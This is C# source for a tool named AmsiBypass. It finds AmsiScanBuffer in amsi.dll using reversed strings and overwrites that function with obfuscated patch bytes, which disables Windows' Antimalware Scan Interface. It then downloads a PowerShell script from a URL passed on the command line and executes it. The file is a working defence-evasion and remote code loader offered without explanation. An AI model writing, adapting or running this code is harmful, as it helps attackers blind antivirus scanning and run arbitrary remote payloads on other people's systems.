using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.IO;
using System.Runtime.InteropServices;
using System.Net;

public class AmsiBypass
{
    public static void Main(string[] args)
    {
        
        // Load amsi.dll and get location of AmsiScanBuffer
        char[] data = "lld.isma".ToCharArray();
        Array.Reverse(data);
        string name = new string(data);

        var a = LoadLibrary(name);

        data = "reffuBnacSismA".ToCharArray();
        Array.Reverse(data);
        name = new string(data);

        var b = GetProcAddress(a, name);

        byte[] newbytes = new byte[] { 0xB9, 0x58, 0x01, 0x08, 0x81, 0xC3, 0x19, 0x01 };

        // Set region to RWX
        _ = VirtualProtect(b, (UIntPtr)newbytes.Length, 0x04, out uint oldProtect);
        for(var i = 0; i < newbytes.Length; i++)
        {
            newbytes[i] = (byte)((int)newbytes[i] - 1);
        }

        // Copy patch
        Marshal.Copy(newbytes, 0, b, newbytes.Length);

        // Restore region to RX
        _ = VirtualProtect(b, (UIntPtr)newbytes.Length, oldProtect, out uint _);

        Console.WriteLine("patched offset 0x{0}", b.ToString("X2"));
        
        
        StringBuilder sb = new StringBuilder();
        try
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            RunspaceInvoke ri = new RunspaceInvoke(rs);

            WebClient wc = new WebClient();
            string urldata = wc.DownloadString(args[0]);
            Pipeline pipe = rs.CreatePipeline();

            pipe.Commands.AddScript(urldata + "; " + args[1]);
            pipe.Commands.Add("Out-String");
            Collection<PSObject> output = pipe.Invoke();
            rs.Close();
            foreach (PSObject line in output)
            {
                sb.AppendLine(line.ToString());
            }
            Console.WriteLine(sb.ToString());
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
        }
    }

    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(
        string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
}
